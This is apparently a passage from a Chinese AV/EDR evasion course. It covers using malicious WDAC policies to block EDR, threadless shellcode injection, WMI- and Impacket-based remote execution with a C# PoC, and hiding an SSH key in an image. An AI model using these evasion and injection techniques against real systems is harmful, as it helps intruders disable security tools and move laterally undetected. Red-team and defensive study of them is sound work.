<h3 id="概念概述："><a href="#概念概述：" class="headerlink" title="概念概述："></a><strong>概念概述：</strong></h3><p>该技术将 WDAC 的 “默认拒绝” 策略执行 <strong>转化为一种攻击武器</strong>。通过编写 <strong>恶意定制的 WDAC 策略</strong>，攻击者可以 <strong>阻止 EDR 加载</strong>，同时 <strong>保持自己的代码执行权限</strong>。该攻击的核心在于 <strong>利用 WDAC 的早期执行</strong>（该策略在引导过程中 <strong>早于</strong> EDR 驱动程序生效），以控制 <strong>哪些代码被允许</strong> 在系统中执行。</p>
<hr>
<h3 id="攻击目标"><a href="#攻击目标" class="headerlink" title="攻击目标"></a>攻击目标</h3><ul>
<li><p><strong>阻止安全工具（如 EDR&#x2F;AV）加载。</strong></p>
</li>
<li><p><strong>允许攻击者的工具执行。</strong></p>
</li>
<li><p><strong>在内核和用户级别实现隐蔽性和持久性。</strong></p>
</li>
</ul>
<hr>
<h3 id="攻击的主要阶段"><a href="#攻击的主要阶段" class="headerlink" title="攻击的主要阶段"></a>攻击的主要阶段</h3><h4 id="阶段-1-放置自定义-WDAC-策略"><a href="#阶段-1-放置自定义-WDAC-策略" class="headerlink" title="阶段 1: 放置自定义 WDAC 策略"></a><strong>阶段 1: 放置自定义 WDAC 策略</strong></h4><p>攻击者将编写并放置一个自定义策略文件到：</p>
<p><code>C:\Windows\System32\CodeIntegrity\SIPolicy.p7b</code></p>
<p>此自定义策略：</p>
<ul>
<li><p>通过哈希、发布者或路径阻止 EDR 驱动程序、传感器和代理二进制文件的执行。</p>
</li>
<li><p>允许攻击者的二进制文件或签名工具（例如 LoLBins）执行。</p>
</li>
<li><p>强制执行看起来在组织策略下 <strong>有效</strong> 的代码完整性规则。</p>
</li>
</ul>
<h4 id="阶段-2-触发策略执行（系统重启）"><a href="#阶段-2-触发策略执行（系统重启）" class="headerlink" title="阶段 2: 触发策略执行（系统重启）"></a><strong>阶段 2: 触发策略执行（系统重启）</strong></h4><p>即使新策略在运行时已被放置，<strong>WDAC 策略只在引导时生效</strong>。这意味着要执行新的限制：</p>
<ul>
<li><p>攻击者重启机器。</p>
</li>
<li><p>在启动时，WDAC <strong>在任何用户或内核模式 EDR 组件加载之前执行新的策略</strong>。</p>
</li>
<li><p>结果是，EDR 驱动程序 <strong>无法初始化</strong>，有效地禁用检测能力。</p>
</li>
</ul>
<h4 id="阶段-3-在新策略下保持访问"><a href="#阶段-3-在新策略下保持访问" class="headerlink" title="阶段 3: 在新策略下保持访问"></a><strong>阶段 3: 在新策略下保持访问</strong></h4><p>一旦系统重启：</p>
<ul>
<li><p>攻击者的有效负载被 <strong>明确允许</strong> 在 WDAC 策略中运行。</p>
</li>
<li><p><strong>EDR 和 AV 被阻止</strong>，失去了检测和遥测功能。</p>
</li>
<li><p>攻击者可以进一步部署植入物、持久性和横向移动 <strong>没有阻力</strong>。</p>
</li>
</ul>
<hr>
<h3 id="关键技术细节"><a href="#关键技术细节" class="headerlink" title="关键技术细节"></a>关键技术细节</h3><ul>
<li><p><strong>WDAC 在内核引导阶段应用</strong>，这使得没有另一次重启就很难覆盖它。</p>
</li>
<li><p>攻击者可以 <strong>伪造合法签名</strong> 或使用受信工具（例如签名的 LoLBins 或受信的安装程序）。</p>
</li>
<li><p>即使在 <strong>强制模式</strong> 下，WDAC 策略也可以被签名并执行，伪装成有效的企业配置。</p>
</li>
<li><p>使用适当的 SID 和 ACL，攻击者可以 <strong>无声地持久化该策略</strong>，而不会引起即时警报。</p>
</li>
</ul>
<hr>
<h3 id="Krueger-的核心特性"><a href="#Krueger-的核心特性" class="headerlink" title="Krueger 的核心特性"></a>Krueger 的核心特性</h3><ul>
<li><p><strong>绕过内核级 EDR 可见性</strong> 通过策略信任边界。</p>
</li>
<li><p>即使设备上强制执行了 WDAC 策略，只要这些策略配置错误，仍然有效。</p>
</li>
<li><p>使用 <strong>漏洞签名二进制文件（LoLBins）</strong> 执行有效负载。</p>
</li>
<li><p>可以 <strong>侧载 DLL</strong> 或通过已知技术劫持 DLL 加载顺序。</p>
</li>
</ul>
<hr>
<h3 id="仓库中使用的其他技术"><a href="#仓库中使用的其他技术" class="headerlink" title="仓库中使用的其他技术"></a>仓库中使用的其他技术</h3><ul>
<li><p><strong>驱动程序签名滥用</strong>：利用微软签名的驱动程序隐藏或加载恶意组件。</p>
</li>
<li><p><strong>符号链接重定向</strong>：使用符号链接将 DLL 加载重定向到攻击者控制的位置。</p>
</li>
<li><p><strong>环境变量注入</strong>：使用 <code>%PATH%</code>、<code>%SYSTEMROOT%</code> 或应用程序特定的配置文件重定向搜索路径。</p>
</li>
<li><p><strong>WDAC 策略降级攻击</strong>：如果配置错误，允许回退到不安全的策略。</p>
</li>
</ul>
<hr>
<h3 id="防御规避影响"><a href="#防御规避影响" class="headerlink" title="防御规避影响"></a>防御规避影响</h3><table>
<thead>
<tr>
<th>技术</th>
<th>EDR 检测</th>
</tr>
</thead>
<tbody><tr>
<td>通过 WDAC 侧载 DLL</td>
<td>❌ 漏检</td>
</tr>
<tr>
<td>签名二进制文件执行（LoLBins）</td>
<td>❌ 漏检</td>
</tr>
<tr>
<td>符号链接重定向</td>
<td>❌ 漏检</td>
</tr>
<tr>
<td>WDAC 允许的 shellcode 执行</td>
<td>❌ 漏检</td>
</tr>
</tbody></table>
<p><em>Krueger 允许任意代码执行，几乎在大多数用户模式 EDR 平台上没有可见性。</em></p>
<hr>
<h3 id="结论-6"><a href="#结论-6" class="headerlink" title="结论"></a>结论</h3><p>Krueger 揭示了企业 EDR 防御中的一个 <strong>关键盲点</strong>：WDAC 强制执行的受信代码路径可以被滥用并 <strong>反过来用于攻击系统</strong>。通过利用 WDAC 的信任模型定制有效负载，红队员和对手可以绕过监控和检测，即使在严格的执行控制环境下。</p>
<p>对于现代的威胁猎人和防御者来说，至关重要的是：</p>
<ul>
<li><p>监控 <strong>行为</strong>，而不是仅仅依赖 <strong>二进制信任</strong>。</p>
</li>
<li><p>实施 <strong>强代码签名验证与运行时完整性检查</strong>。</p>
</li>
<li><p>审计 <strong>DLL 搜索顺序</strong> 并防止已知 LoLBins 滥用。</p>
</li>
</ul>
<h2 id="AV-EDR-规避实战技巧-8-14-ThreadlessInject-无线程的-Shellcode-执行"><a href="#AV-EDR-规避实战技巧-8-14-ThreadlessInject-无线程的-Shellcode-执行" class="headerlink" title="AV&#x2F;EDR 规避实战技巧 - 8.14 - ThreadlessInject: 无线程的 Shellcode 执行"></a>AV&#x2F;EDR 规避实战技巧 - 8.14 - ThreadlessInject: 无线程的 Shellcode 执行</h2><h3 id="Threadless-Injection：一种隐秘的-API-钩子技术"><a href="#Threadless-Injection：一种隐秘的-API-钩子技术" class="headerlink" title="Threadless Injection：一种隐秘的 API 钩子技术"></a><strong>Threadless Injection：一种隐秘的 API 钩子技术</strong></h3><p><strong>概述</strong></p>
<p>Threadless Injection 是一种先进的代码注入方法，允许在 <strong>不创建新线程</strong> 的情况下执行有效载荷。与传统的注入技术不同，它通过插入一个最小化的“重定向”跳转 (trampoline) 来修改现有的导出函数，将其指向一个隐藏的有效载荷，该有效载荷通常存储在一个被称为 <strong>内存孔（memory hole）</strong> 的临近内存区域。</p>
<p>这项技术的特别之处在于，执行完有效载荷后，目标函数可以完全恢复，并正常继续运行——就好像什么都没发生过一样。</p>
<hr>
<h3 id="内存孔发现"><a href="#内存孔发现" class="headerlink" title="内存孔发现"></a><strong>内存孔发现</strong></h3><p>现代 Windows 进程加载了许多 DLL，这些 DLL 之间有时会留下小的未分配内存间隙。这些空间，如果位于目标函数地址的 ±2GB 范围内，可以利用 <code>CALL</code> 指令的相对寻址限制来存储 Shellcode。</p>
<p>例如，<code>FindMemoryHole</code> 这样的自定义程序可以用于扫描和分配这个允许的范围内的内存，通过对齐地址和测试分配，直到成功为止。这样可以避免那些可能触发启发式检测或访问违规的远程内存区域。</p>
<hr>
<h3 id="最小化-Trampoline-Hook"><a href="#最小化-Trampoline-Hook" class="headerlink" title="最小化 Trampoline Hook"></a><strong>最小化 Trampoline Hook</strong></h3><p>与直接覆盖整个函数体不同，Threadless Injection 会在目标函数的开始部分写入一个紧凑的 <code>CALL</code> 指令——这是一个 5 字节的重定向，指向存储在内存孔中的自定义有效载荷。这种 trampoline 保留了周围函数的逻辑，并减少了检测的向量。</p>
<p>一旦控制转移，重定向代码（称为 <strong>固定 Shellcode</strong>）会恢复被覆盖的字节，并确保在有效载荷执行后目标函数的正常行为。</p>
<hr>
<h3 id="Shellcode-结构"><a href="#Shellcode-结构" class="headerlink" title="Shellcode 结构"></a><strong>Shellcode 结构</strong></h3><p>有效载荷被组织为两个独立的部分：</p>
<ol>
<li><p><strong>预加载器（固定 Shellcode）</strong>：</p>
<ul>
<li><p>保存寄存器上下文和参数。</p>
</li>
<li><p>恢复目标函数的原始字节。</p>
</li>
<li><p>执行实际的 Shellcode。</p>
</li>
<li><p>恢复保存的状态。</p>
</li>
<li><p>将控制权交还给合法函数。</p>
</li>
</ul>
</li>
<li><p><strong>主有效载荷</strong>：</p>
<ul>
<li><p>自定义的 Shellcode（例如反向 shell、Meterpreter）。</p>
</li>
<li><p>可以通过 <code>msfvenom</code> 等工具混淆或生成。</p>
</li>
</ul>
</li>
</ol>
<p>在注入之前，预加载代码内部的占位符会被函数的原始字节修补，以便在执行完有效载荷后恢复。</p>
<hr>
<h3 id="运行时修补示例"><a href="#运行时修补示例" class="headerlink" title="运行时修补示例"></a><strong>运行时修补示例</strong></h3><p>一个像 <code>PatchHookShellcode()</code> 这样的函数会读取被钩住函数的前 8 个字节，并将占位符替换为固定 Shellcode 内的原始字节。这确保了在有效载荷执行后，函数能够无缝恢复。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 用实际的函数前导字节覆盖 Shellcode 中的占位符</span><br>VOID <span class="hljs-title function_">PatchHookShellcode</span><span class="hljs-params">(IN PVOID pFunc)</span> &#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> originalBytes = *(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span>*)pFunc;<br>    <span class="hljs-built_in">memcpy</span>(&amp;g_HookShellcode[<span class="hljs-number">22</span>], &amp;originalBytes, <span class="hljs-keyword">sizeof</span>(originalBytes));<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="注入工作流总结"><a href="#注入工作流总结" class="headerlink" title="注入工作流总结"></a><strong>注入工作流总结</strong></h3><ol>
<li><p>确定目标函数（例如通过 <code>GetProcAddress</code>）。</p>
</li>
<li><p>定位该函数附近的内存孔。</p>
</li>
<li><p>将固定的 Shellcode 和主有效载荷写入内存孔。</p>
</li>
<li><p>在函数的开头插入 trampoline（<code>CALL &lt;relative_offset&gt;</code>）。</p>
</li>
<li><p>当函数被调用时，有效载荷运行，并在清理后将控制权交还。</p>
</li>
</ol>
<hr>
<h3 id="规避潜力"><a href="#规避潜力" class="headerlink" title="规避潜力"></a><strong>规避潜力</strong></h3><p>该技术避免了生成新线程或创建远程内存区域，因此在行为检测引擎或 EDR 下更难引起怀疑。由于被钩住的函数按预期执行，且原始字节在飞行过程中得以恢复，内存扫描器和完整性检查更难标记此行为。</p>
<hr>
<h3 id="检测挑战"><a href="#检测挑战" class="headerlink" title="检测挑战"></a><strong>检测挑战</strong></h3><table>
<thead>
<tr>
<th>行为</th>
<th>典型检测？</th>
</tr>
</thead>
<tbody><tr>
<td>没有调用 CreateRemoteThread</td>
<td>❌ 未标记</td>
</tr>
<tr>
<td>正常的 Windows API 使用</td>
<td>✅ 允许</td>
</tr>
<tr>
<td>异常的内存保护（RWX）</td>
<td>⚠️ 可能被标记</td>
</tr>
<tr>
<td>将 Shellcode 作为回调（不常见）</td>
<td>❌ 很少检查</td>
</tr>
</tbody></table>
<hr>
<h3 id="参考资料-2"><a href="#参考资料-2" class="headerlink" title="参考资料"></a><strong>参考资料</strong></h3><ul>
<li><p>GitHub 仓库: <a target="_blank" rel="noopener" href="https://github.com/CCob/ThreadlessInject">https://github.com/CCob/ThreadlessInject</a></p>
</li>
<li><p>技术展示者：安全研究员 <strong>Chris Cobb</strong>（CCob）</p>
</li>
<li><p>在 EDR 规避和后渗透工具包中经常被引用。</p>
</li>
</ul>
<h1 id="模块-9-–-后渗透阶段的-EDR-行为检测规避"><a href="#模块-9-–-后渗透阶段的-EDR-行为检测规避" class="headerlink" title="模块 9 – 后渗透阶段的 EDR 行为检测规避"></a>模块 9 – 后渗透阶段的 EDR 行为检测规避</h1><h2 id="AV-EDR-规避实战技巧-9-1-WMIC-和-PsExec-规避技术"><a href="#AV-EDR-规避实战技巧-9-1-WMIC-和-PsExec-规避技术" class="headerlink" title="AV&#x2F;EDR 规避实战技巧 - 9.1 - WMIC 和 PsExec 规避技术"></a>AV&#x2F;EDR 规避实战技巧 - 9.1 - WMIC 和 PsExec 规避技术</h2><h3 id="概述-13"><a href="#概述-13" class="headerlink" title="概述"></a><strong>概述</strong></h3><p><strong>WMIC</strong> 和 <strong>PsExec</strong> 是对手在后渗透阶段常用的工具，用于远程执行命令或在不同的上下文中生成进程。然而，这些工具是众所周知的，现代 EDR（终端检测与响应）系统会对其使用进行监控。</p>
<p>在本模块中，我们将探索：</p>
<ul>
<li><p>为什么这些工具会被监控</p>
</li>
<li><p>如何使用 <strong>LOLBAS</strong>（Living off the Land Binaries And Scripts）绕过检测</p>
</li>
<li><p>自定义实现的 <code>PsExec</code></p>
</li>
<li><p>内存执行替代方案</p>
</li>
<li><p>实际的 PoC（概念验证）</p>
</li>
</ul>
<hr>
<h3 id="1-检测配置文件"><a href="#1-检测配置文件" class="headerlink" title="1. 检测配置文件"></a><strong>1. 检测配置文件</strong></h3><p>EDR 通常监控：</p>
<ul>
<li><p>来自 <code>wmic.exe</code> 或 <code>psexec.exe</code> 的子进程创建</p>
</li>
<li><p>网络连接（PsExec 的默认端口 445）</p>
</li>
<li><p>异常的父子进程关系</p>
</li>
<li><p>高权限上下文使用（例如，SYSTEM）</p>
</li>
</ul>
<hr>
<h3 id="2-WMIC-规避"><a href="#2-WMIC-规避" class="headerlink" title="2. WMIC 规避"></a><strong>2. WMIC 规避</strong></h3><p><strong>基本的 WMIC 命令</strong>：</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">wmic /node:<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">50</span> /user:admin process <span class="hljs-keyword">call</span> create &quot;<span class="hljs-built_in">cmd</span>.exe /c whoami&quot;<br></code></pre></td></tr></table></figure>

<p><strong>问题</strong>：</p>
<ul>
<li><p>这会在 Windows 安全事件日志中记录（事件 ID 4688）</p>
</li>
<li><p><code>wmic.exe</code> 是一个已知的 <strong>LOLBIN</strong>，会被高度监控</p>
</li>
</ul>
<p><strong>规避 1 - 使用 WMI COM 对象代替 wmic.exe（PowerShell）</strong>：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$comp</span> = [<span class="hljs-type">WMIClass</span>]<span class="hljs-string">&quot;\\192.168.1.50\root\cimv2:Win32_Process&quot;</span><br><span class="hljs-variable">$comp</span>.Create(<span class="hljs-string">&quot;cmd.exe /c whoami&quot;</span>)<br></code></pre></td></tr></table></figure>

<p><strong>为什么有效</strong>：</p>
<ul>
<li><p>避免使用 <code>wmic</code> 二进制文件</p>
</li>
<li><p>看起来像是正常的 WMI 使用</p>
</li>
<li><p>与像 SCCM 这样的管理工具相似</p>
</li>
</ul>
<hr>
<h3 id="3-PsExec-规避"><a href="#3-PsExec-规避" class="headerlink" title="3. PsExec 规避"></a><strong>3. PsExec 规避</strong></h3><p><strong>默认的 PsExec 使用</strong>：</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">PsExec.exe \\<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">50</span> -u admin -p password <span class="hljs-built_in">cmd</span>.exe<br></code></pre></td></tr></table></figure>

<p>这将：</p>
<ul>
<li><p>在远程机器上创建一个服务</p>
</li>
<li><p>以 SYSTEM 身份执行</p>
</li>
<li><p>创建网络痕迹</p>
</li>
</ul>
<p><strong>规避 1 - 使用 Impacket 的 smbexec.py 或 psexec.py</strong>（Python）：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 smbexec.py WORKGROUP/admin@192.168.1.50<br></code></pre></td></tr></table></figure>

<p><strong>为什么有效</strong>：</p>
<ul>
<li><p>完全可控的源代码</p>
</li>
<li><p>可以混淆或修改以绕过基于签名的检测</p>
</li>
<li><p>无需在磁盘上留下二进制文件（无代理）</p>
</li>
</ul>
<p><strong>规避 2 - 自定义的 PsExec 实现（C#）</strong>（PoC）</p>
<hr>
<h3 id="4-C-实现的自定义-PsExec（PoC）"><a href="#4-C-实现的自定义-PsExec（PoC）" class="headerlink" title="4. C# 实现的自定义 PsExec（PoC）"></a><strong>4. C# 实现的自定义 PsExec（PoC）</strong></h3><p>这个 PoC 使用 WMI 和 Win32_Process 模拟 PsExec，而无需丢弃 <code>PsExec.exe</code>。</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">using</span> System;<br><span class="hljs-keyword">using</span> System.Management;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">CustomExec</span><br>&#123;<br>    <span class="hljs-keyword">class</span> <span class="hljs-title">Program</span><br>    &#123;<br>        <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Main</span>(<span class="hljs-params"><span class="hljs-built_in">string</span>[] args</span>)</span><br>        &#123;<br>            ConnectionOptions conn = <span class="hljs-keyword">new</span> ConnectionOptions();<br>            conn.Username = <span class="hljs-string">&quot;admin&quot;</span>;<br>            conn.Password = <span class="hljs-string">&quot;password&quot;</span>;<br>            conn.Impersonation = ImpersonationLevel.Impersonate;<br><br>            ManagementScope scope = <span class="hljs-keyword">new</span> ManagementScope(<span class="hljs-string">&quot;\\\\192.168.1.50\\root\\cimv2&quot;</span>, conn);<br>            scope.Connect();<br><br>            ObjectGetOptions objectGetOptions = <span class="hljs-keyword">new</span> ObjectGetOptions();<br>            ManagementPath managementPath = <span class="hljs-keyword">new</span> ManagementPath(<span class="hljs-string">&quot;Win32_Process&quot;</span>);<br>            ManagementClass processClass = <span class="hljs-keyword">new</span> ManagementClass(scope, managementPath, objectGetOptions);<br><br>            ManagementBaseObject inParams = processClass.GetMethodParameters(<span class="hljs-string">&quot;Create&quot;</span>);<br>            inParams[<span class="hljs-string">&quot;CommandLine&quot;</span>] = <span class="hljs-string">&quot;cmd.exe /c whoami &gt; C:\\Windows\\Temp\\output.txt&quot;</span>;<br><br>            processClass.InvokeMethod(<span class="hljs-string">&quot;Create&quot;</span>, inParams, <span class="hljs-literal">null</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>编译命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">csc CustomExec.cs<br></code></pre></td></tr></table></figure>

<p><strong>行为优点</strong>：</p>
<ul>
<li><p>不需要 <code>PsExec.exe</code></p>
</li>
<li><p>无需安装服务</p>
</li>
<li><p>看起来是正常的 WMI 使用</p>
</li>
</ul>
<hr>
<h3 id="5-其他规避思路"><a href="#5-其他规避思路" class="headerlink" title="5. 其他规避思路"></a><strong>5. 其他规避思路</strong></h3><table>
<thead>
<tr>
<th>技术</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>重命名 PsExec.exe</td>
<td>简单的绕过哈希检测</td>
</tr>
<tr>
<td>混淆二进制文件</td>
<td>使用 UPX 或自定义打包工具</td>
</tr>
<tr>
<td>手动使用 services.exe</td>
<td>通过 SC 或自定义 RPC 调用创建远程服务</td>
</tr>
<tr>
<td>注入 Shellcode 到远程内存</td>
<td>使用 Cobalt Strike 或 SharpRDP 进行隐蔽操作</td>
</tr>
</tbody></table>
<hr>
<h3 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a><strong>总结</strong></h3><ul>
<li><p>避免使用默认的二进制文件，如 <code>wmic.exe</code> 和 <code>psexec.exe</code></p>
</li>
<li><p>利用 PowerShell 或自定义 .NET 替代方案</p>
</li>
<li><p>使用内存常驻工具（例如 Impacket）或 COM 对象</p>
</li>
<li><p>减少行为足迹，避免使用默认端口</p>
</li>
</ul>
<h2 id="AV-EDR-规避实战技巧-9-2-使用隐写术在企业环境中安全分发密钥"><a href="#AV-EDR-规避实战技巧-9-2-使用隐写术在企业环境中安全分发密钥" class="headerlink" title="AV&#x2F;EDR 规避实战技巧 - 9.2 - 使用隐写术在企业环境中安全分发密钥"></a>AV&#x2F;EDR 规避实战技巧 - 9.2 - 使用隐写术在企业环境中安全分发密钥</h2><p><strong>主题</strong>: 使用隐写术和加密元数据指令将 SSH 私钥隐藏在图像中。</p>
<p>概念由 <a target="_blank" rel="noopener" href="https://www.linkedin.com/in/shanelilly/overlay/about-this-profile/">Shane Lilly, CSAE, CSIE</a> 提出。</p>
<hr>
<h3 id="目标-7"><a href="#目标-7" class="headerlink" title="目标"></a>目标</h3><p>通过本课，学生应能够：</p>
<ul>
<li><p>理解使用隐写术技术将敏感文件隐藏在图像文件中的方法。</p>
</li>
<li><p>使用隐写术工具（如 <code>steghide</code>）将私钥嵌入图像。</p>
</li>
<li><p>使用工具（如 <code>exiftool</code>）在图像的元数据中嵌入加密的指令。</p>
</li>
<li><p>使用 RSA 加密和外部粘贴服务（如 Pastebin）加密和创建指令消息。</p>
</li>
<li><p>从隐写图像中提取并解密隐藏的消息和密钥。</p>
</li>
</ul>
<hr>
<h3 id="所需工具与设置"><a href="#所需工具与设置" class="headerlink" title="所需工具与设置"></a>所需工具与设置</h3><p><strong>工具：</strong></p>
<ul>
<li><p><code>steghide</code>: 用于在图像中嵌入和提取隐藏数据的工具。</p>
</li>
<li><p><code>exiftool</code>: 用于查看和编辑图像元数据的工具。</p>
</li>
<li><p><code>openssl</code>: 用于生成 RSA 密钥对并加密&#x2F;解密消息的工具。</p>
</li>
<li><p>一个基于 Linux 的操作系统（推荐 Ubuntu&#x2F;Debian）。</p>
</li>
</ul>
<h3 id="安装命令（Debian-Ubuntu）："><a href="#安装命令（Debian-Ubuntu）：" class="headerlink" title="安装命令（Debian&#x2F;Ubuntu）："></a>安装命令（Debian&#x2F;Ubuntu）：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt install steghide exiftool openssl curl<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="场景描述"><a href="#场景描述" class="headerlink" title="场景描述"></a>场景描述</h3><p>假设以下情况：</p>
<p>你希望在公司网络中安全地分发 SSH 私钥，该私钥可以访问一台虚拟机。为了避免被检测并确保安全通信，你决定：</p>
<ul>
<li><p>使用隐写术将 SSH 私钥巧妙地嵌入常见的图像文件中。</p>
</li>
<li><p>在图像的元数据中嵌入指向外部加密消息（例如，Pastebin 上的链接）。</p>
</li>
<li><p>使用 RSA-4096 加密单独加密外部指令。</p>
</li>
</ul>
<p>这种方法提供了合理的否认性、抵抗自动化检测，并有效地保护了敏感数据。</p>
<hr>
<h3 id="步骤逐步实践"><a href="#步骤逐步实践" class="headerlink" title="步骤逐步实践"></a>步骤逐步实践</h3><h3 id="步骤-1-准备文件"><a href="#步骤-1-准备文件" class="headerlink" title="步骤 1: 准备文件"></a><strong>步骤 1: 准备文件</strong></h3><p>假设以下初始文件：</p>
<ul>
<li><p><code>cover_image.jpg</code>: 用作封面的一张常规图像。</p>
</li>
<li><p><code>ssh_private_key.pem</code>: 要隐藏的 SSH 私钥。</p>
</li>
</ul>
<hr>
<h3 id="步骤-2-将-SSH-私钥嵌入图像"><a href="#步骤-2-将-SSH-私钥嵌入图像" class="headerlink" title="步骤 2: 将 SSH 私钥嵌入图像"></a><strong>步骤 2: 将 SSH 私钥嵌入图像</strong></h3><p><strong>使用 steghide</strong>：</p>
<p>执行以下命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">steghide embed -cf cover_image.jpg -ef ssh_private_key.pem -sf secret_image.jpg -p <span class="hljs-string">&#x27;StrongPasswordHere&#x27;</span><br></code></pre></td></tr></table></figure>

<ul>
<li><p><code>-cf</code>: 指定封面文件（原始图像）。</p>
</li>
<li><p><code>-ef</code>: 要嵌入的文件（SSH 私钥）。</p>
</li>
<li><p><code>-sf</code>: 输出含有隐藏数据的图像文件。</p>
</li>
<li><p><code>-p</code>: 用于后续提取的密码。</p>
</li>
</ul>
<p>现在，<code>secret_image.jpg</code> 中包含了隐藏的 SSH 私钥。</p>
<hr>
<h3 id="步骤-3-创建并加密外部指令（Pastebin）"><a href="#步骤-3-创建并加密外部指令（Pastebin）" class="headerlink" title="步骤 3: 创建并加密外部指令（Pastebin）"></a><strong>步骤 3: 创建并加密外部指令（Pastebin）</strong></h3><h3 id="3-1-生成-RSA-4096-密钥对进行加密："><a href="#3-1-生成-RSA-4096-密钥对进行加密：" class="headerlink" title="3.1 生成 RSA-4096 密钥对进行加密："></a>3.1 生成 RSA-4096 密钥对进行加密：</h3><p>使用 OpenSSL 生成 RSA 密钥：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">openssl genrsa -out pastebin_private.pem 4096<br>openssl rsa -<span class="hljs-keyword">in</span> pastebin_private.pem -pubout -out pastebin_public.pem<br></code></pre></td></tr></table></figure>

<ul>
<li><p><code>pastebin_public.pem</code>: 用于加密指令。</p>
</li>
<li><p><code>pastebin_private.pem</code>: 保密，用于稍后解密指令。</p>
</li>
</ul>
<hr>
<h3 id="3-2-编写指令（明文）"><a href="#3-2-编写指令（明文）" class="headerlink" title="3.2 编写指令（明文）"></a>3.2 编写指令（明文）</h3><p>创建一个名为 <code>instructions.txt</code> 的文本文件，包含访问信息：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Corporate SSH Access Information:<br><br>VM IP: 10.10.50.22<br>SSH User: ubuntu<br>SSH Port: 22<br><br>Use the SSH private key embedded within the provided image to access the VM.<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="3-3-加密指令："><a href="#3-3-加密指令：" class="headerlink" title="3.3 加密指令："></a>3.3 加密指令：</h3><p>使用 RSA 公钥加密指令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">openssl rsautl -encrypt -pubin -inkey pastebin_public.pem -<span class="hljs-keyword">in</span> instructions.txt -out instructions.enc<br></code></pre></td></tr></table></figure>

<p>将加密后的指令转换为 Base64 格式，以便安全地在线发布：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">base64</span> instructions.enc &gt; instructions_base64.txt<br></code></pre></td></tr></table></figure>

<ul>
<li>将 <code>instructions_base64.txt</code> 的内容复制到 Pastebin 或类似的文本托管服务上。</li>
</ul>
<p>保存 Pastebin 链接（例如，<code>https://pastebin.com/abcXYZ</code>），以便稍后插入元数据。</p>
<hr>
<h3 id="步骤-4-将-Pastebin-链接嵌入图像元数据"><a href="#步骤-4-将-Pastebin-链接嵌入图像元数据" class="headerlink" title="步骤 4: 将 Pastebin 链接嵌入图像元数据"></a><strong>步骤 4: 将 Pastebin 链接嵌入图像元数据</strong></h3><p>使用 <code>exiftool</code> 将 Pastebin 链接嵌入图像元数据中：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">exiftool -Comment=<span class="hljs-string">&#x27;https://pastebin.com/abcXYZ&#x27;</span> secret_image.jpg<br></code></pre></td></tr></table></figure>

<p>这一步将一个包含链接的评论悄无声息地添加到图像中。</p>
<hr>
<h3 id="最终结果："><a href="#最终结果：" class="headerlink" title="最终结果："></a>最终结果：</h3><p><code>secret_image.jpg</code> 现在包含：</p>
<ul>
<li><p>使用 <code>steghide</code> 隐藏的 SSH 私钥。</p>
</li>
<li><p>隐藏在图像元数据中的加密外部 Pastebin 链接。</p>
</li>
</ul>
